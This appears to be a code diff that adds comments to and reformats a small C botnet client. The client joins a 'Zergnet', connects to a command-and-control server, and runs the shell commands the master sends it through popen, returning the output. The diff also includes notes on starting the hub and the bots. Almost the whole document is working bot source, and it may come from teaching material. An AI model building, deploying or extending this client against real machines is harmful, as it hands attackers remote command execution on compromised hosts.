@@ -32,54 +32,65 @@
 #define MAX_BUF 1024
 
 #define PEXIT(str) {perror (str);exit(1);}
+
+// ======================= VARIABLES =======================
+
+// Variable used as Bot identifier
 static char *bot_id = NULL;
 
-int
-bot_print (int s, char *str)
-{
+// Encrypted and decrypted variables are used to validate the message
+int encrypted_size = 0;
+int decrypted_size = 0;
+
+// ======================= METHODS =======================
+
+// ===== BOT "bot_print" =====
+// Method to print in the bot console
+int bot_print (int s, char *str){
   return write (s, str, strlen(str));
 }
 
-int
-bot_read (int s, char *msg)
-{
+
+// ===== BOT "bot_read" =====
+// Method to catch the instruction written by the master
+int bot_read (int s, char *msg){
   memset (msg, 0, MAX_BUF);
   if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");
 
   return 0;
 }
 
-int
-bot_run_cmd (int s, char *cmd)
-{
+
+// ===== BOT "bot_run_cmd" =====
+// Method to execute the command; prints in the console of master the result
+int bot_run_cmd (int s, char *cmd){
   char  line[1024];
   FILE *f = popen (cmd,"r");
 
   if (!f) return -1;
-  while (!feof (f))
-    {
+  while (!feof (f)){
       if (!fgets (line, 1024, f)) break;
       bot_print (s, ">>>");
       bot_print (s, bot_id);
       bot_print (s, ": ");
       bot_print (s, line);
-    }
+  }
   fclose(f);
 
   return 0;
 }
 
-int
-bot_parse (int s, char *msg)
-{
+
+// ===== BOT "bot_parse" =====
+// Method to extract the target and command
+int bot_parse (int s, char *msg){
   char *target = msg;
   char *cmd = NULL;
 
-  if ((cmd = strchr (msg, ':')) == NULL)
-    {
+  if ((cmd = strchr (msg, ':')) == NULL){
       printf ("!! Malformed command. Should be TARGET:command\n");
       return -1;
-    }
+  }
 
   *cmd = 0;
   cmd++;
@@ -95,9 +106,9 @@ bot_parse (int s, char *msg)
 }
 
 
-int
-bot_connect_cc (char *ip, int port)
-{
+// ===== BOT "bot_connect_cc" =====
+// Method to connect to the master
+int bot_connect_cc (char *ip, int port){
   char                 msg[1024];
   struct sockaddr_in   server;
   int                  s;
@@ -116,9 +127,10 @@ bot_connect_cc (char *ip, int port)
   return s;
 }
 
-int
-main (int argc, char* argv[])
-{
+
+// ===== BOT "main" =====
+// Main Method. An infinitive loop is created to read and execute commands
+int main (int argc, char* argv[]){
   char  msg[MAX_BUF]; 
   int   cc_s;
 
@@ -127,12 +139,15 @@ main (int argc, char* argv[])
  
   printf ("'%s' joining the Zergnet\n", bot_id);
   cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
-  while (1)
-    {
+  while (1){
       bot_read (cc_s, msg);
       bot_parse (cc_s, msg);
-    }
+  }
 }
 
-// C&C : nk -hub -s T,9999
-// Bots: ./bot BotName
+// ===== BOT "Ended notes" =====
+// >>> To run the master:
+// nk -hub -s T,9999
+
+// >>> To run the bots:
+// ./bot BotName
